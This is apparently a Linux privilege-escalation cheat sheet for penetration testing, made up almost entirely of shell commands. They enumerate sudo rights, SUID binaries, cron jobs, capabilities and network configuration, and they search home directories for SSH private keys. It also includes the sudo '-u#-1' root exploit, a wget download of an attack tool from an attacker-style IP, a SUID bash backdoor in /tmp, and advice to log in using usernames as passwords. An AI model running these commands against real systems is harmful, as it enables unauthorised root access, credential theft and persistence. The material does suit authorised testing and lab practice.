```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

grep *sh$ /etc/passwd

id

find / -group <groups> 2>/dev/null

history

sudo -l

sudo -V | grep version

find / -name id_rsa 2>/dev/null
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

find / -type f -perm -04000 -ls 2>/dev/null

ls -la /etc/passwd /etc/shadow /etc/security/opasswd

cat /etc/crontab
crontab -l
ls /etc/cron.d
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

cat /etc/exports
cat /etc/fstab

sudo -u#-1 /bin/bash

ip a
ifconfig
netstat -r
ip route
ss -anp
routel
cat /etc/iptables/rules.v4

cat .bashrc

ps -aux
ps -aux | grep cron        <-- search for "root   /usr/sbin/cron -f"

realm list
ps -ef | grep -i "winbind\|sssd"

ls -l /tmp /var/tmp /dev/shm /opt

logrotate -v

ps aux | grep tmux

dpkg -l
```
1. Snoop on processes using pspy - some cron jobs may be running in the background
2. Research and enumerate literally every cron job running
3. su into other users using their usernames as passwords; vagrant:vagrant
4. Run PEAS and LinEnum
```shell 
wget 192.168.45.x/sudodoom
```

```bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```